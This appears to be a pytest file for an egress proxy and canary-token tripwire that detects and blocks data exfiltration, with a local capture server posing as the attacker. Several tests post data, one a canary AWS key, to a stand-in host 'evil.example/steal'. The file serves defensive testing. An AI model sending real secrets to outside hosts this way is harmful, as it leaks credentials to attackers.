"""Tests for the live egress packet feed (on_request callback + event shapes)."""
from __future__ import annotations

import base64
import urllib.request
import urllib.error

import pytest

from arena import tripwire
from arena.attacker_server import CaptureServer
from arena.egress import EgressProxy, _mask_preview


# ---------------------------------------------------------------- fixtures

@pytest.fixture
def canaries():
    return tripwire.mint("feed-sess")


@pytest.fixture
def capture():
    s = CaptureServer(host="127.0.0.1", port=0)
    s.start()
    yield s
    s.stop()


def _proxy_request(proxy_url, target_url, body=None, method="GET"):
    proxy_handler = urllib.request.ProxyHandler({"http": proxy_url})
    opener = urllib.request.build_opener(proxy_handler)
    data = body.encode() if isinstance(body, str) else body
    req = urllib.request.Request(target_url, data=data, method=method)
    return opener.open(req, timeout=10)


# ---------------------------------------------------------------- _mask_preview

class TestMaskPreview:
    def test_masks_canary_value(self, canaries):
        text = f"here is {canaries['stripe_key']} in text"
        result = _mask_preview(text, canaries)
        assert canaries["stripe_key"] not in result
        assert "sk_live_" in result  # prefix preserved
        assert "[CANARY:stripe_key]" in result

    def test_truncates_to_max_len(self, canaries):
        text = "a" * 500
        result = _mask_preview(text, canaries, max_len=100)
        assert len(result) <= 200  # some overhead for mask tokens is ok

    def test_no_canary_unchanged(self, canaries):
        text = "just normal text"
        result = _mask_preview(text, canaries)
        assert result == "just normal text"


# ---------------------------------------------------------------- on_request callback shapes

class TestEgressFeedGuardOn:
    """Guard ON: on_request fires for every request with correct event shape."""

    def test_blocked_canary_event(self, capture, canaries):
        events = []
        p = EgressProxy(capture.url, canaries, guard=True,
                         on_trip=lambda t: None, on_request=events.append)
        p.start()
        try:
            body = f"secret={canaries['aws_access_key']}"
            with pytest.raises(urllib.error.HTTPError):
                _proxy_request(p.url, capture.url + "/collect",
                               body=body, method="POST")
            assert len(events) == 1
            ev = events[0]
            assert ev["decision"] == "blocked_canary"
            assert ev["method"] == "POST"
            assert ev["canary"] is not None
            assert ev["canary"]["name"] == "aws_access_key"
            assert isinstance(ev["bytes"], int)
            assert ev["bytes"] > 0
            # Preview must mask the canary
            assert canaries["aws_access_key"] not in ev["preview"]
        finally:
            p.stop()

    def test_blocked_not_allowed_event(self, capture, canaries):
        events = []
        p = EgressProxy(capture.url, canaries, guard=True,
                         on_trip=lambda t: None, on_request=events.append)
        p.start()
        try:
            with pytest.raises(urllib.error.HTTPError):
                _proxy_request(p.url, "http://evil.example/steal",
                               body="clean", method="POST")
            assert len(events) == 1
            ev = events[0]
            assert ev["decision"] == "blocked_not_allowed"
            assert ev["host"] == "evil.example"
            assert ev["canary"] is None
        finally:
            p.stop()

    def test_allowed_event(self, capture, canaries):
        """M5: guard ON blocks ALL destinations including the capture server."""
        events = []
        p = EgressProxy(capture.url, canaries, guard=True,
                         on_trip=lambda t: None, on_request=events.append)
        p.start()
        try:
            with pytest.raises(urllib.error.HTTPError) as exc_info:
                _proxy_request(p.url, capture.url + "/collect",
                               body="clean data", method="POST")
            assert exc_info.value.code == 403
            assert len(events) == 1
            ev = events[0]
            assert ev["decision"] == "blocked_not_allowed"
            assert ev["canary"] is None
        finally:
            p.stop()


class TestEgressFeedGuardOff:
    """Guard OFF: on_request fires with forwarded_to_attacker."""

    def test_forwarded_event(self, capture, canaries):
        events = []
        p = EgressProxy(capture.url, canaries, guard=False,
                         on_trip=lambda t: None, session="off-feed",
                         on_request=events.append)
        p.start()
        try:
            resp = _proxy_request(p.url, "http://evil.example/steal",
                                  body="data", method="POST")
            assert resp.status == 200
            assert len(events) == 1
            ev = events[0]
            assert ev["decision"] == "forwarded_to_attacker"
            assert ev["host"] == "evil.example"
            assert ev["path"] == "/steal"
        finally:
            p.stop()


# ---------------------------------------------------------------- backward compat

class TestBackwardCompat:
    """Existing signatures work without on_request."""

    def test_no_callback_works(self, capture, canaries):
        """M5: guard ON blocks all; verify no crash without on_request callback."""
        p = EgressProxy(capture.url, canaries, guard=True, on_trip=lambda t: None)
        p.start()
        try:
            with pytest.raises(urllib.error.HTTPError) as exc_info:
                _proxy_request(p.url, capture.url + "/collect",
                               body="safe", method="POST")
            assert exc_info.value.code == 403
        finally:
            p.stop()


# ---------------------------------------------------------------- attacker listener

class TestAttackerListener:
    """CaptureServer per-session listener callback."""

    def test_listener_fires_on_data(self, capture, canaries):
        events = []
        capture.watch("listen-sess", canaries)
        capture.add_listener("listen-sess", events.append)
        body = canaries["aws_access_key"].encode()
        req = urllib.request.Request(
            capture.url + "/s/listen-sess/collect", data=body, method="POST")
        req.add_header("X-Original-Host", "evil.example")
        req.add_header("X-Original-Path", "/steal")
        urllib.request.urlopen(req, timeout=5)
        assert len(events) == 1
        ev = events[0]
        assert ev["canary_hit"] is True
        assert ev["target"] == "evil.example/steal"
        assert isinstance(ev["bytes"], int)
        # Preview is masked
        assert canaries["aws_access_key"] not in ev["preview"]

    def test_no_listener_still_works(self, capture):
        """Without a listener, capture server works normally."""
        req = urllib.request.Request(
            capture.url + "/collect", data=b"data", method="POST")
        resp = urllib.request.urlopen(req, timeout=5)
        assert resp.status == 200
        assert len(capture.loot()) == 1
